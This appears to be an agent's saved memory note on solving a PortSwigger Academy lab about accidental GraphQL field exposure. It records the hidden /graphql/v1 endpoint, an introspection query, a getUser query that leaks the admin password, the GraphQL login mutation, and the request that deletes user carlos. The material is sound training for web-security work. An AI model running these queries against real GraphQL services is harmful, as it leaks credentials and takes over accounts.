---
metadata:
  node_type: memory
name: "Lab GraphQL accidental field exposure arm A"
description: "Solved GraphQL accidental field exposure (arm A): endpoint is /graphql/v1 (not /graphql), getUser(id:1) leaks admin password, login via GraphQL mutation token, then /admin/delete?username=carlos."
last_updated: 2026-10-10T10:50:46+08:00
created: 2026-10-10T10:50:46+08:00
---

## 2026 GraphQL accidental private-field exposure (arm A, solved)

- Target: portswigger academy /web-security/graphql/lab-graphql-accidental-field-exposure; instance 0a5400de...web-security-academy.net.
- Endpoint discovery: login page `onsubmit="gqlLogin(...)"` + `<script src=/resources/js/gqlUtil.js>` + `blogSummaryGql.js`; gqlUtil.js `sendQuery` fetch target = **`/graphql/v1`** (NOT `/graphql`; POST to `/graphql` returns 404 "Not Found").
- Introspection works: `POST /graphql/v1` query `{ __schema { queryType { fields { name args { name type { name kind ofType { name kind } } } type { name kind } } } } }` reveals `getUser(id: Int!): User`.
- Leak: `{"query":"query { getUser(id: 1) { id username password } }"}` -> administrator + password.
- Login is GraphQL, not the form: `POST /graphql/v1` `{"query":"mutation login($input: LoginInput!) { login(input: $input) { token success } }","operationName":"login","variables":{"input":{"username":"administrator","password":"..."}}}` returns token and Set-Cookie session=token. Plain `POST /login` = 405 Method Not Allowed.
- Then `GET /admin`, `GET /admin/delete?username=carlos` (302 -> /admin, banner is-solved).
- Lesson: read the page's own JS (gqlUtil.js, loginGql.js) for the real endpoint path and auth shape before guessing; form POST is often disabled.

